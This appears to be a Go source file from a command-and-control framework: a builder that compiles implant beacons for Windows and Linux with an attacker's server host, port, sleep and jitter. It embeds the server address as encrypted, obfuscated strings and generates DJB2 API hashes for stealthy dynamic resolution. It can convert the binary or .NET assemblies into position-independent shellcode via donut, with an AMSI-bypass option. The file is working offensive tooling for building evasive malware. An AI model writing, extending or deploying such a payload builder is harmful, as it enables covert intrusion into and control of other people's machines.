package builder

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"time"

	"c2/hashgen"
	"c2/obfgen"
)

var hostRE = regexp.MustCompile(`^[a-zA-Z0-9.\-]{1,253}$`)

// BuildParams holds all parameters for a beacon build.
type BuildParams struct {
	ServerHost       string // IP or hostname embedded in config.h
	ServerPort       int    // TCP port (1–65535)
	SleepMS          int    // beacon sleep interval in milliseconds (1000–259200000)
	JitterPct        int    // jitter percentage (0–100)
	BeaconSrc        string // absolute path to the beacon/ source directory
	UseHTTPS         bool   // beacon uses HTTPS (WINHTTP_FLAG_SECURE)
	IgnoreCertErrors bool   // beacon ignores TLS cert errors (self-signed cert)
	Format           string // output format: "exe" (default) or "bin" (shellcode via donut)
	SessionPort      int    // TCP port for session mode (0 = disabled)
	Platform         string // "windows" (default) or "linux"
}

func validate(p BuildParams) error {
	if !hostRE.MatchString(p.ServerHost) {
		return fmt.Errorf("invalid server_host %q: must match [a-zA-Z0-9.\\-]{1,253}", p.ServerHost)
	}
	if p.ServerPort < 1 || p.ServerPort > 65535 {
		return fmt.Errorf("server_port must be 1–65535, got %d", p.ServerPort)
	}
	if p.SleepMS < 1000 || p.SleepMS > 259200000 {
		return fmt.Errorf("sleep_ms must be 1000–259200000, got %d", p.SleepMS)
	}
	if p.JitterPct < 0 || p.JitterPct > 100 {
		return fmt.Errorf("jitter_pct must be 0–100, got %d", p.JitterPct)
	}
	return nil
}

func configH(p BuildParams) string {
	base := fmt.Sprintf(`#pragma once

#define SERVER_PORT  %d
#define SLEEP_MS     %d
#define JITTER_PCT   %d
`, p.ServerPort, p.SleepMS, p.JitterPct)

	if p.UseHTTPS {
		base += "#define USE_HTTPS\n"
	}
	if p.IgnoreCertErrors {
		base += "#define IGNORE_CERT_ERRORS\n"
	}
	if p.SessionPort > 0 {
		base += fmt.Sprintf("#define SESSION_PORT  %d\n", p.SessionPort)
	}
	return base
}

func configHLinux(p BuildParams) string {
	base := fmt.Sprintf(`#ifndef CONFIG_H
#define CONFIG_H

#define SERVER_PORT     %d
#define SLEEP_MS        %d
#define JITTER_PCT      %d
`, p.ServerPort, p.SleepMS, p.JitterPct)

	if p.UseHTTPS {
		base += "#define SERVER_USE_TLS      1\n"
	} else {
		base += "#define SERVER_USE_TLS      0\n"
	}
	if p.IgnoreCertErrors {
		base += "#define IGNORE_CERT_ERRORS  1\n"
	} else {
		base += "#define IGNORE_CERT_ERRORS  0\n"
	}
	if p.SessionPort > 0 {
		base += fmt.Sprintf("#define SESSION_PORT  %d\n", p.SessionPort)
	}
	base += "\n#endif\n"
	return base
}

// Build validates params, copies beacon source to a temp directory,
// injects a custom config.h, runs cmake, and returns the compiled binary.
// The temp directory is removed on return regardless of outcome.
func Build(p BuildParams) ([]byte, error) {
	if err := validate(p); err != nil {
		return nil, err
	}
	if p.Platform == "" {
		p.Platform = "windows"
	}

	tmpDir, err := os.MkdirTemp("", "byps-build-*")
	if err != nil {
		return nil, fmt.Errorf("mkdirtemp: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Select source directory based on platform
	beaconSrcName := "beacon"
	if p.Platform == "linux" {
		beaconSrcName = "beacon-linux"
		p.BeaconSrc = filepath.Join(filepath.Dir(p.BeaconSrc), "beacon-linux")
	}

	srcDir := filepath.Join(tmpDir, beaconSrcName)
	buildDir := filepath.Join(tmpDir, "build")

	cp := exec.Command("cp", "-r", p.BeaconSrc, srcDir)
	if out, err := cp.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("copy beacon source: %w\n%s", err, out)
	}

	// Overwrite include/config.h with build-specific values
	configPath := filepath.Join(srcDir, "include", "config.h")
	var configContent string
	if p.Platform == "linux" {
		configContent = configHLinux(p)
	} else {
		configContent = configH(p)
	}
	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		return nil, fmt.Errorf("write config.h: %w", err)
	}

	// Generate obf_strings.h with the correct server host encrypted
	includeDir := filepath.Join(srcDir, "include")
	if err := obfgen.Generate(p.ServerHost, includeDir, p.Platform); err != nil {
		return nil, fmt.Errorf("generate obf_strings.h: %w", err)
	}

	// Generate api_hashes.h — DJB2 constants for dynamic API resolution (Windows only)
	if p.Platform != "linux" {
		if err := hashgen.Generate(includeDir); err != nil {
			return nil, fmt.Errorf("generate api_hashes.h: %w", err)
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	// cmake configure — platform-specific toolchain
	var configure *exec.Cmd
	if p.Platform == "linux" {
		prefixMap := fmt.Sprintf("-ffile-prefix-map=%s/=", srcDir)
		configure = exec.CommandContext(ctx, "cmake",
			"-S", srcDir, "-B", buildDir,
			"-DCMAKE_C_COMPILER=musl-gcc",
			"-DCMAKE_C_FLAGS="+prefixMap)
	} else {
		toolchain := filepath.Join(srcDir, "mingw64.cmake")
		configure = exec.CommandContext(ctx, "cmake",
			"-S", srcDir, "-B", buildDir,
			"-DCMAKE_TOOLCHAIN_FILE="+toolchain)
	}
	if out, err := configure.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("cmake configure: %w\n%s", err, out)
	}

	// cmake build
	build := exec.CommandContext(ctx, "cmake", "--build", buildDir)
	if out, err := build.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("cmake build: %w\n%s", err, out)
	}

	// Read output binary
	var outputName string
	if p.Platform == "linux" {
		outputName = "beacon.elf"
	} else {
		outputName = "beacon.exe"
	}
	data, err := os.ReadFile(filepath.Join(buildDir, outputName))
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", outputName, err)
	}

	// Shellcode conversion (Windows only)
	if p.Platform != "linux" && p.Format == "bin" {
		sc, err := donutConvert(data, "", 0, 1)
		if err != nil {
			return nil, fmt.Errorf("donut shellcode: %w", err)
		}
		data = sc
	}

	return data, nil
}

// donutConvert uses python3-donut to convert a PE to shellcode.
func donutConvert(payload []byte, args string, bypass int, exitOpt int) ([]byte, error) {
	tmpDir, err := os.MkdirTemp("", "bebop_donut_")
	if err != nil {
		return nil, fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	inPath := filepath.Join(tmpDir, "payload.exe")
	if err := os.WriteFile(inPath, payload, 0600); err != nil {
		return nil, fmt.Errorf("write payload: %w", err)
	}

	outPath := filepath.Join(tmpDir, "payload.bin")

	pyScript := fmt.Sprintf(
		`import donut,sys;sc=donut.create(file=%q,output=%q,arch=2,bypass=%d,compress=1,exit_opt=%d`,
		inPath, outPath, bypass, exitOpt)
	if args != "" {
		pyScript += fmt.Sprintf(`,params=%q`, args)
	}
	pyScript += `);sys.exit(0 if sc is not None else 1)`

	cmd := exec.Command("python3", "-c", pyScript)
	cmd.Dir = tmpDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("donut failed: %w\noutput: %s", err, string(output))
	}

	sc, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("read shellcode: %w\ndonut output: %s", err, string(output))
	}
	if len(sc) == 0 {
		return nil, fmt.Errorf("donut produced empty shellcode\noutput: %s", string(output))
	}

	return sc, nil
}

// AssemblyToShellcode converts a .NET assembly (EXE) to PIC shellcode via python3-donut.
func AssemblyToShellcode(assembly []byte, args string) ([]byte, error) {
	return donutConvert(assembly, args, 3, 1)
}
